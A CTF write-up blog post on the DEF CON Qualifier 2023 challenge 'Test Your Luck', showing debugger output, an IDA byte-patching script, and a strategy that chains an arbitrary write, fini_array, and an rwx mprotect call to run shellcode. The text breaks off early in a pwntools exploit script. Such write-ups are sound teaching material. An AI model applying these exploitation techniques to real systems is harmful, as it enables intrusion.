<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1871   Can you beat the hottest new skill-based game sweeping the nation? Is guessing 32 bits really possible within the span of the CTF?   [30 solves]  very fun challenge X">
<meta property="og:type" content="article">
<meta property="og:title" content="DEF CON CTF Qualifier 2023 - Test Your Luck (LiveCTF)">
<meta property="og:url" content="https://jiravvit.github.io/230601-defcon2023-test-your-luck/index.html">
<meta property="og:site_name" content="jir4vvit">
<meta property="og:description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1871   Can you beat the hottest new skill-based game sweeping the nation? Is guessing 32 bits really possible within the span of the CTF?   [30 solves]  very fun challenge X">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://jiravvit.github.io/images/230601-defcon2023-test-your-luck/1.png">
<meta property="og:image" content="https://jiravvit.github.io/images/230601-defcon2023-test-your-luck/2.png">
<meta property="og:image" content="https://jiravvit.github.io/images/230601-defcon2023-test-your-luck/3.png">
<meta property="og:image" content="https://jiravvit.github.io/images/230601-defcon2023-test-your-luck/6.png">
<meta property="og:image" content="https://jiravvit.github.io/images/230601-defcon2023-test-your-luck/4.png">
<meta property="og:image" content="https://jiravvit.github.io/images/230601-defcon2023-test-your-luck/5.png">
<meta property="article:published_time" content="2023-05-31T22:00:00.000Z">
<meta property="article:modified_time" content="2023-06-02T14:24:09.496Z">
<meta property="article:author" content="jir4vvit">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://jiravvit.github.io/images/230601-defcon2023-test-your-luck/1.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/judi2.jpg">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/judi2.jpg" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/judi2.jpg">
        
      
    
    <!-- title -->
    <title>DEF CON CTF Qualifier 2023 - Test Your Luck (LiveCTF)</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/230524-deadsecctf2023-one_punch/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/230601-defcon2023-test-your-luck/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/230601-defcon2023-test-your-luck/&text=DEF CON CTF Qualifier 2023 - Test Your Luck (LiveCTF)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/230601-defcon2023-test-your-luck/&title=DEF CON CTF Qualifier 2023 - Test Your Luck (LiveCTF)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/230601-defcon2023-test-your-luck/&is_video=false&description=DEF CON CTF Qualifier 2023 - Test Your Luck (LiveCTF)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=DEF CON CTF Qualifier 2023 - Test Your Luck (LiveCTF)&body=Check out this article: https://jiravvit.github.io/230601-defcon2023-test-your-luck/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/230601-defcon2023-test-your-luck/&title=DEF CON CTF Qualifier 2023 - Test Your Luck (LiveCTF)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/230601-defcon2023-test-your-luck/&title=DEF CON CTF Qualifier 2023 - Test Your Luck (LiveCTF)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/230601-defcon2023-test-your-luck/&title=DEF CON CTF Qualifier 2023 - Test Your Luck (LiveCTF)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/230601-defcon2023-test-your-luck/&title=DEF CON CTF Qualifier 2023 - Test Your Luck (LiveCTF)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/230601-defcon2023-test-your-luck/&name=DEF CON CTF Qualifier 2023 - Test Your Luck (LiveCTF)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/230601-defcon2023-test-your-luck/&t=DEF CON CTF Qualifier 2023 - Test Your Luck (LiveCTF)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">2.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">2.1.</span> <span class="toc-text">Exploit Code</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        DEF CON CTF Qualifier 2023 - Test Your Luck (LiveCTF)
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">jir4vvit</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-05-31T22:00:00.000Z" itemprop="datePublished">2023-06-01</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/WriteUp/">WriteUp</a> › <a class="category-link" href="/categories/WriteUp/Defcon/">Defcon</a>
    </div>


      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <ul>
<li><a target="_blank" rel="noopener" href="https://ctftime.org/event/1871">https://ctftime.org/event/1871</a></li>
</ul>
<blockquote>
<p>Can you beat the hottest new skill-based game sweeping the nation? Is guessing 32 bits really possible within the span of the CTF?</p>
</blockquote>
<ul>
<li>[30 solves]</li>
</ul>
<p>very fun challenge XD</p>
<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>IDA로 봤을 때보다 더 많은 로직이 있는 것 같았다. 그래서 나는 주로 GDB를 이용하여 분석했다. IDA에서 암호화된 함수를 찾을 수 있었다.</p>
<p>It seems to have a bit more logic than the function seen with IDA. So I usually analyzed with GDB. I could find encrypted function in IDA.</p>
<img src="/images/230601-defcon2023-test-your-luck/1.png" width=550/>
<br>

<p>위 함수가 동적 디버깅할 때는 잘 해석이 되어서 바이트를 추출해서 패치를 해주기로 하였다.</p>
<p>The above function was interpreted well during dynamic debugging, so I decided to extract the bytes and patch them.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; x/20i 0x555555556000</span><br><span class="line">   0x555555556000:      endbr64</span><br><span class="line">   0x555555556004:      push   r12</span><br><span class="line">   0x555555556006:      xor    r9d,r9d</span><br><span class="line">   0x555555556009:      xor    r8d,r8d</span><br><span class="line">   0x55555555600c:      mov    ecx,0x8</span><br><span class="line">   0x555555556011:      push   rbp</span><br><span class="line">   0x555555556012:      mov    esi,0x1</span><br><span class="line">   0x555555556017:      mov    edi,0x1</span><br><span class="line">   0x55555555601c:      push   rbx</span><br><span class="line">   0x55555555601d:      sub    rsp,0x20</span><br><span class="line">   0x555555556021:      mov    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x55555555602a:      mov    QWORD PTR [rsp+0x18],rax</span><br><span class="line">   0x55555555602f:      lea    rax,[rip+0xffffffffffffdfca]        # 0x555555554000</span><br><span class="line">   0x555555556036:      lea    rdx,[rsp+0x8]</span><br><span class="line">   0x55555555603b:      lea    rbp,[rsp+0x10]</span><br><span class="line">   0x555555556040:      mov    QWORD PTR [rsp+0x8],rax</span><br><span class="line">   0x555555556045:      call   0x5555555552e9 &lt;syscall&gt;</span><br><span class="line">   0x55555555604a:      lea    r12,[rip+0x22ef]        # 0x555555558340</span><br><span class="line">   0x555555556051:      jmp    0x5555555560a9</span><br><span class="line">   0x555555556053:      nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">...</span><br><span class="line">   0x555555556145:      sub    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x55555555614e:      jne    0x555555556159</span><br><span class="line">   0x555555556150:      add    rsp,0x20</span><br><span class="line">   0x555555556154:      pop    rbx</span><br><span class="line">   0x555555556155:      pop    rbp</span><br><span class="line">   0x555555556156:      pop    r12</span><br><span class="line">   0x555555556158:      ret</span><br><span class="line">   0x555555556159:      call   0x555555555030 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x55555555615e:      add    BYTE PTR [rax],al</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; p/x 0x55555555615e - 0x555555556000</span><br><span class="line">$3 = 0x15e</span><br><span class="line">gef&gt; print-format --length 0x15e --bitlen 8 --lang py 0x555555556000</span><br><span class="line">buf = [0xf3, 0xf, ... ]</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">buf = [<span class="number">0xf3</span>, <span class="number">0xf</span>, <span class="number">0x1e</span>, <span class="number">0xfa</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0xb9</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x55</span>, <span class="number">0xbe</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xbf</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x53</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xec</span>, <span class="number">0x20</span>, <span class="number">0x64</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x4</span>, <span class="number">0x25</span>, <span class="number">0x28</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x18</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x5</span>, <span class="number">0xca</span>, <span class="number">0xdf</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x54</span>, <span class="number">0x24</span>, <span class="number">0x8</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x6c</span>, <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x8</span>, <span class="number">0xe8</span>, <span class="number">0x9f</span>, <span class="number">0xf2</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x4c</span>, <span class="number">0x8d</span>, <span class="number">0x25</span>, <span class="number">0xef</span>, <span class="number">0x22</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xeb</span>, <span class="number">0x56</span>, <span class="number">0xf</span>, <span class="number">0x1f</span>, <span class="number">0x44</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x5c</span>, <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x5c</span>, <span class="number">0x24</span>, <span class="number">0x8</span>, <span class="number">0x4c</span>, <span class="number">0x39</span>, <span class="number">0xe3</span>, <span class="number">0x72</span>, <span class="number">0xd</span>, <span class="number">0x48</span>, <span class="number">0x3b</span>, <span class="number">0x1d</span>, <span class="number">0x12</span>, <span class="number">0x25</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf</span>, <span class="number">0x86</span>, <span class="number">0x9c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xdb</span>, <span class="number">0xf</span>, <span class="number">0x84</span>, <span class="number">0xc3</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0xb9</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xea</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xe8</span>, <span class="number">0x4c</span>, <span class="number">0xf2</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x7e</span>, <span class="number">0x4f</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x3</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0xb9</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xea</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x10</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xe8</span>, <span class="number">0x20</span>, <span class="number">0xf2</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x7f</span>, <span class="number">0x8b</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0xbe</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xbf</span>, <span class="number">0x3c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xe8</span>, <span class="number">0x3</span>, <span class="number">0xf2</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xe9</span>, <span class="number">0x6d</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xf</span>, <span class="number">0x1f</span>, <span class="number">0x44</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0xbe</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xbf</span>, <span class="number">0x3c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xe8</span>, <span class="number">0xe0</span>, <span class="number">0xf1</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xeb</span>, <span class="number">0x96</span>, <span class="number">0xf</span>, <span class="number">0x1f</span>, <span class="number">0x44</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0xbe</span>, <span class="number">0x4</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xbf</span>, <span class="number">0x3c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xe8</span>, <span class="number">0xc0</span>, <span class="number">0xf1</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x5c</span>, <span class="number">0x24</span>, <span class="number">0x8</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xdb</span>, <span class="number">0xf</span>, <span class="number">0x85</span>, <span class="number">0x46</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x66</span>, <span class="number">0xf</span>, <span class="number">0x1f</span>, <span class="number">0x84</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x44</span>, <span class="number">0x24</span>, <span class="number">0x18</span>, <span class="number">0x64</span>, <span class="number">0x48</span>, <span class="number">0x2b</span>, <span class="number">0x4</span>, <span class="number">0x25</span>, <span class="number">0x28</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x75</span>, <span class="number">0x9</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc4</span>, <span class="number">0x20</span>, <span class="number">0x5b</span>, <span class="number">0x5d</span>, <span class="number">0x41</span>, <span class="number">0x5c</span>, <span class="number">0xc3</span>, <span class="number">0xe8</span>, <span class="number">0xd2</span>, <span class="number">0xee</span>, <span class="number">0xff</span>, <span class="number">0xff</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(buf)):</span><br><span class="line">    addr = <span class="number">0x2000</span> + i</span><br><span class="line">    byte = buf[i]</span><br><span class="line"></span><br><span class="line">    cmd = <span class="string">&#x27;patch_byte(&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(addr))+<span class="string">&#x27;,&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(byte))+<span class="string">&#x27;);&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(cmd) </span><br></pre></td></tr></table></figure>

<p>위 파이썬 스크립트를 실행해서 나온 결과를 IDA에서 스크립트로 실행하면 된다. 이때 중요한 점은 IDA에 반영하고 ‘reanalyze program’ 한 후 껐다 켜야 디컴파일이 되는데 끌 때 ‘DON’T SAVE the database’을 체크해야 한다.</p>
<p>You can execute the result of executing the above python script as a script in IDA. At this time, the important point is to reflect in IDA, ‘reanalyze program’, and guit IDA. When quiting it, You have to check ‘DON’T SAVE the database’. Now, you can see decompiled source code.</p>
<img src="/images/230601-defcon2023-test-your-luck/2.png" width=550/>
<br>

<img src="/images/230601-defcon2023-test-your-luck/3.png" width=550/>
<br>

<p>사실 나는 함수를 디코드 하기 전에 디버깅하면서 임의쓰기를 발견했다. while문을 이용해서 원하는 만큼 임의 쓰기가 가능하다. syscall을 이용해서 buf에 8바이트 입력을 받는데, 특정 주소를 거르고 있다. 이는 got 영역을 포함한다. 반복문을 끝내고 싶으면 0을 입력하면 된다. 30번째 라인에서 원하는 주소에 원하는 값을 쓰는 것을 확인할 수 있다.</p>
<p>Actually I found arbitrary writes before decoding the function. It is possible to write arbitrarily as many times as desired by using a while statement. The buf is received 8 bytes input by using a syscall. It’s filtering out a specific address including got space. If you want to end the loop, you can send 0. In the 30th line, you can find exactly arbitrary writes.</p>
<img src="/images/230601-defcon2023-test-your-luck/6.png" width=550/>
<br>

<p>sub_2000 함수를 xref로 확인해보면 sub_2000 함수를 decode 해주는 함수를 찾을 수 있다. 그 함수에서 sub_2000을 decode 한 후, 특정한 프로그램 영역을 rwx로 권한을 바꿔주는 함수를 호출한다. 이 함수를 mprotect_rwx() 함수로 네이밍해주었다. 이 문제는 NX_bit 보호기법이 없어서 이 함수를 활용하면 좋겠다는 생각을 했다.  </p>
<p>If you check the sub_2000 function by xref, you can find a function that decodes the sub_2000 function. After decode sub_2000 in that function, call a function that changes the authority of a specific program area to rwx. I named this function mprotect_rwx() function. Since there is no NX bit mitigation for this challenge, I thought it would be nice to use this function.</p>
<p>sub_2000 함수를 호출하면 아래와 같은 로직의 generate_random() 함수를 호출한다. 사실상 완전한 random이 아니기 때문에 예측가능하다. </p>
<p>When the sub_2000 function is called the generated_random() function is called. The random_value isn’t definitly random. So It could be predictable.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dword_45B0 = dword_45B8 + dword_45B0 * dword_45B4;<span class="comment">// random_value 예측 가능</span></span><br><span class="line">random_value = dword_45B0;</span><br></pre></td></tr></table></figure>

<p>우리에겐 임의 쓰기가 있기 때문에 random_value를 예측할 수 있다. 이 함수가 종료되면 드디어 main 함수가 호출되는데, random_value는 main 함수에서 사용된다. random_value를 예측하면 Correct!을 출력하고 틀리면 Incorrect를 출력해준다. main 함수에서는 별다른 취약점이 보이지 않았다.</p>
<p>Because we have arbitrary writes, you can predict random_value. When this function ends, the main function is finally called, and random_value is used in the main function. If random_value is predicted, ‘Correct!’ is output, otherwise ‘Incorrect’ is output. I couldn’t find any vulnerabilities in the main function.</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>처음에 pie 주소가 출력되어서 이것부터 릭해주었다. </p>
<p>At first, the pie address was printed, So I leaked it.</p>
<p>전략은 다음과 같다. 쉘코드 실행이 가능하기 때문에 쉘코드 실행을 목표로 삼았다. 그리고 임의 쓰기를 이용하여 w 권한이 주어진 곳에 쉘코드를 쓰기로 했다. 스택 주소를 알기가 힘들기 때문에 지금 현재 알고 있는 pie 주소를 최대한 활용하고자 했다. </p>
<p>The strategy is this. Because shellcode execution is possible, I targeted shellcode execution. And I decide to write shellcode at area with w authority by using arbitrary writes. It was difficult to know stack address, So I wanted to make the most of the pie address I currently know.</p>
<img src="/images/230601-defcon2023-test-your-luck/4.png" width=600/>
<br>

<p>mprotect_rwx() 함수가 호출되면 위와 같이 저 영역이 rwx로 변하기 때문에 적당하다고 생각했다. 이를 위해 generate_random() 함수 대신 mprotect_rwx() 함수가 실행되도록 하기로 결심했다. 마지막으로 fini_array를 이용해서 sub_2000가 한 번 더 실행되게 했다.</p>
<p>When mprotect_rwx() function was called, the above area was changed to rwx autority. So I thought this area was suitable for writing shellcode. For this, I decided to have the mprotect_rwx() function call instead of the generate_random() function. Finally sub_2000 function is called one more time by using fini_array.</p>
<p>sub_2000가 한 번 더 실행되고, 이제 rwx 권한이 주어진 프로그램 영역에 임의 쓰기가 가능하다. sub_2000 함수에서 임의쓰기가 끝난 후 종료되는 아래 영역이 쉘코드를 작성하기에 가장 적당하다고 판단했다.  </p>
<p>The sub_2000 is called one more, and now arbitrary writes are possible to the program area given the rwx permission. In the sub_2000 function, it was determined that the area below, which ends after arbitrary writing is finished, is the most suitable for writing shellcode.</p>
<img src="/images/230601-defcon2023-test-your-luck/5.png" width=550/>
<br>

<h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">HOST = os.environ.get(<span class="string">&#x27;HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>)</span><br><span class="line">PORT = <span class="number">31337</span></span><br><span class="line"></span><br><span class="line">p = remote(HOST, <span class="built_in">int</span>(PORT))</span><br><span class="line"><span class="comment"># p = process(&#x27;./../handout/challenge&#x27;)</span></span><br><span class="line"></span><br><span class="line">pie_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># info(hex(pie_base))</span></span><br><span class="line"></span><br><span class="line">fini_array = pie_base + <span 